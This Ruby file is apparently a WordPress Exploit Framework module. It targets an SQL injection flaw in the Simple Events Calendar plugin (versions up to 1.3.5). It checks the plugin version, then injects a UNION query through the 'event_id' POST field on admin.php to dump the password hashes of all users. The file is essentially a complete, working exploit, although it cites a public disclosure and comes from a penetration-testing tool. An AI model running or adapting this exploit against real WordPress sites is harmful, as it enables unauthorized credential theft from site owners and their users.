# frozen_string_literal: true

class Wpxf::Auxiliary::SimpleEventsCalendarHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'Simple Events Calendar <= 1.3.5 Authenticated Hash Dump',
      desc: %(
        Simple Events Calendar <= 1.3.5 contains an SQL injection vulnerability
        which can be leveraged by all registered users with the permission
        to manage events. This module utilises this vulnerability
        to dump the hashed passwords of all users in the database.
      ),
      author: [
        'Lenon Leite', # Disclosure
        'rastating'    # WPXF module
      ],
      references: [
        ['WPVDB', '8955'],
        ['URL', 'http://lenonleite.com.br/en/blog/2017/11/03/simple-events-calendar-1-3-5-wordpress-plugin-sql-injection/']
      ],
      date: 'Nov 03 2017'
    )
  end

  def check
    check_plugin_version_from_readme('simple-events-calendar', '1.3.6')
  end

  def requires_authentication
    true
  end

  def reveals_one_row_per_request
    true
  end

  def hashdump_request_method
    :post
  end

  def hashdump_request_params
    {
      'page' => 'simple-events'
    }
  end

  def hashdump_request_body
    {
      'edit'     => '1',
      'event_id' => "-#{Utility::Text.rand_numeric(2)} union #{hashdump_sql_statement} #"
    }
  end

  def hashdump_visible_field_index
    3
  end

  def hashdump_number_of_cols
    9
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php')
  end
end
